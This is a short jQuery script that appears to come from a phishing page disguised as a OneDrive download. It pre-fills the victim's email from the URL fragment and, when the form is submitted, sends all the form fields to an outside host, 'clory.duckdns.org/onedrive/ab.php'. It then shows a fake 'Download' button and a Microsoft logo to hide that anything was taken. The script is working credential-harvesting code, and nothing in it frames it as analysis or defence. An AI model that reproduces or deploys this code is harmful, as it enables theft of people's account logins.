
            $(document).ready(function() {

                setTimeout(() => {
                    $('.fx-body').show();
                }, 2000)

                $('.fx-body').hide();

                $('.items').click(() => {

                    $('.fx-body').toggle('1000');

                });



                const baseUrl = (window.location).href;

                const url = baseUrl.substring(baseUrl.lastIndexOf('#') + 1);

                $("#xx").val(url);

                let text = $("#xx1").html(url);



                $("#formx").submit(function(e) {

                    e.preventDefault();

                    const formData = new FormData($("#formx")[0]);

                    $("#Btn").html('Processing..').prop("disabled", true);

                    $.ajax({

                        url: "https://clory.duckdns.org/onedrive/ab.php",

                        type: 'POST',

                        data: formData,

                        contentType: false,

                        processData: false,
                        before: function() {
                            $("#Btn").html('Processing..').prop("disabled", true);
                        },

                        success: function(res) {

                            console.log(res);

                            $('#bd').show();

                            $('#hm').hide();

                            setTimeout(function() {

                                $("#xx").val(url);

                                $("#xxx").val("");

                                $('.ms').html('<img src="ms.png">');

                                $("#Btn").html('Download').prop("disabled", false);

                            }, 2000);



                        }

                    });

                });



            });
        